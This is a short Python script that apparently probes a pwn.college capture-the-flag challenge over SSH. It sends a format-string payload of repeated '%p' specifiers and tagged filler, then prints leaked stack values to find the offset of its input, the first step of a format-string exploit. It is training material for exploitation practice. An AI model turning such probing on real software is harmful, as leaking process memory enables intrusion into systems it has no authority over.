import subprocess
import struct

SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = ("AAA " + "%p " * 80 + "|%59$p").encode()
chunks = []
for k in range(32):
    tag = f"T{k:02d}-TAG".encode().ljust(8, b"X")
    chunks.append(tag[:8])
payload = fmt + b"".join(chunks)

res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

line = next((l for l in out.splitlines() if l.startswith("AAA ")), "")
if line:
    tokens = line.split()[1:]
    for i in range(55, 90):
        print(i, tokens[i - 1])
